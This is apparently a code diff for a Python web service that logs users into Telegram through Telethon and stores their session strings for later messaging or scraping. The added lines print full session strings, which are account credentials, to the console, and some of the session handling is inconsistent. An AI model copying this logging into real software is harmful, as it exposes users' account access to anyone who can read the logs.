@@ -278,8 +278,8 @@ async def request_code():
     session = StringSession(session_string) if session_string else StringSession()
 
     # Initialize the Telegram client
-    print("Starting client...")
-    user_client = TelegramClient(session, api_id, api_hash)
+    print(f"Starting client with this session: {session} and session string {session_string}...")
+    user_client = TelegramClient(f"session_{phone}", api_id, api_hash)
     try:
         await user_client.connect()
         sent_code = await user_client.send_code_request(phone)
@@ -304,11 +304,18 @@ async def verify_code():
     phone_code_hash = data.get('phone_code_hash')
     password = data.get('password', None)  # For 2FA password
     chat_id = data.get('chat_id')
+    scraper = data.get('scraper')
 
     if not phone or not code or not phone_code_hash or not chat_id:
         return jsonify({'error': 'Phone, code, phone_code_hash, and chat_id are required'}), 400
 
-    user_client = TelegramClient(f'session_{phone}', api_id, api_hash)
+     # Try to retrieve the session from the database
+    session_string = get_session_from_db(chat_id)
+    session = StringSession(session_string) if session_string else StringSession()
+
+    # Initialize the Telegram client
+    print("Starting client...")
+    user_client = TelegramClient(f"session_{phone}", api_id, api_hash)
     try:
         await user_client.connect()
         await user_client.sign_in(phone, code, phone_code_hash=phone_code_hash)
@@ -320,27 +327,28 @@ async def verify_code():
                 return jsonify({'error': 'Two-factor authentication required'}), 403
 
         # Save user session
-        session_path = f'session_{phone}'
-        user_client.session.save()
-        save_user_to_db(chat_id, phone, session_path)
+         # Save the session back to the database
+        save_session_to_db(chat_id, user_client.session.save())
+        save_user_to_db(chat_id, phone, session)
 
-        # Send a message after successful login
-        await send_message(user_client)
+        if not scraper:
+            # Send a message after successful login
+            await send_message(user_client)
 
         return jsonify({'message': 'Login successful and action performed'})
     except PhoneCodeInvalidError:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': 'Invalid login code'}), 400
     except SessionPasswordNeededError:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
         return jsonify({'error': 'Two-factor authentication required'}), 403
     except Exception as e:
-        delete_session(phone)
+        delete_session_from_db(chat_id)
+        print(f'error: {e}')
         return jsonify({'error': f'Error: {e}'}), 500
     finally:
         await user_client.disconnect()
     
-
 
 
 # API to trigger send_message function
